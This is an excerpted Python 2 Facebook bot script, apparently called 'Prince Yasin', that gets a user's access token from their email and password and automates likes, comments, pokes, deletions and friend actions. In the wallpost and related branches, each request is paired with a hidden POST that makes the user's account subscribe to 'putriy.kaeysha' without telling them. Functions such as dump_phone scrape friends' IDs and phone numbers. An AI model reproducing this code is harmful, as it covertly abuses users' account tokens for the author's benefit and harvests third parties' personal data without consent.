...
def baliho():
	try:
		login = open('cookie/login.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_login=' + login)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])
...
def info_ga():
  ...
  -------------       -------------------------------------
   ...
   login              Generate access login
   cat_login          show your access login
   rm_login           remove access login
...
'''%(G,W)
####################################################################
#                     GENERATE ACCESS login
def get(data):
	print '[*] Generate access login '
	...
	b = open('cookie/login.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_login'])
		b.close()
		print '[*] successfully generate access login'
		print '[*] Your access login is stored in cookie/login.log'
		exit()
	except KeyError:
		print '[!] Failed to generate access login'
		print '[!] Check your connection / email or password'
		os.remove('cookie/login.log')
		main()
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_login='+login);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_login='+login);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_login=' + login);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_login=' + login);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_login='+login);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_login='+login);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		result = json.loads(r.text)
		...
		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_login=%s"%(id,login));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_login='+login)
		result = json.loads(r.text)
...
def like(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			parameters = {'access_login' : login , 'type' : type}
...
def comment(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			parameters = {'access_login' : login, 'message' : message}
...
def remove(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_login={login}'.format(id=post['id'],login=login))
			a = json.loads(r.text)
...
def confirm(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/me/friends/%s?access_login=%s'%(post['from']['id'] , login))
			a = json.loads(r.text)
...
def unfollow(posts):
	...
	try:
		...
		for post in posts['data']:
			...
			r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_login=' + login)
			a = json.loads(r.text)
...
def poke(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/%s/pokes?access_login=%s'%(post['id'].split('_')[0],login))
			a = json.loads(r.text)
...
def albums(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&access_login='+login)
			a = json.loads(r.text)
...
def menu_reaction_ask():
  try:
	...
	cek = raw_input(R + 'Prince Yasin' + W + '/' + R + 'Bot' + W + '/' + R + 'Reaction' + W + ' >> ')
	...
	if cek in ['1','01']:
		...
		try:
			open('cookie/login.log')
			print '[!] an access login already exists'
		...
		print '\n' + '[*] Generate Access login facebook [*]'.center(44) + '\n'
...
def bot_ask():
	...
	print '[*] load access login '
	try:
		login = open('cookie/login.log','r').read()
		print '[*] Success load access login'
	except IOError:
		print '[!] Failed load access login'
		print "[!] type 'login' to generate access login"
		menu_reaction_ask()
...
def bot():
  try:
	global type , message , id , WT , login

	cek = raw_input(R + 'Prince Yasin' + W +'/' + R +'Bot ' + W + '>> ')
...
def dump_id():
	...
	try:
		...
		r = requests.get('https://graph.facebook.com/me/friends?access_login='+login)
		a = json.loads(r.text)
...
def dump_phone():
	...
	try:
		...
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_login="+login)
			z = json.loads(x.text)
...
def dump_id_id():
	...
	try:
		r = requests.get('https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_login={login}'.format(id=target_id,login=login))
		a = json.loads(r.text)
...
def main():
  ...
  try:
	cek = raw_input(R + 'Prince Yasin' + W +' >> ')
	...
	if cek.lower() == 'get_data':
		...
		menu_bot()
		bot()
	elif cek.lower() == "cat_login":
		try:
			o = open('cookie/login.log','r').read()
			print '[*] Your access login !!\n\n' + o + '\n'
			main()
		except IOError:
			print '[!] failed to open cookie/login.log'
			print "[!] type 'login' to generate access login"
			main()
		...
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	elif cek.lower() == 'rm_login':
		print '''
[Warn] you must create access login again if 
       your access login is deleted
'''
		a = raw_input("[!] type 'delete' to continue : ")
		if a.lower() == 'delete':
			try:
				os.system('rm -rf cookie/login.log')
				print '[*] Success delete cookie/login.log'
				main()
			except OSError:
				print '[*] failed to delete cookie/login.log'
				main()
		else:
			print '[*] failed to delete cookie/login.log'
			main()
...
def getdata():
	...
	try:
		...
		print '[!] Your access login is expired'
		print "[!] type 'login' to generate access login"
		main()
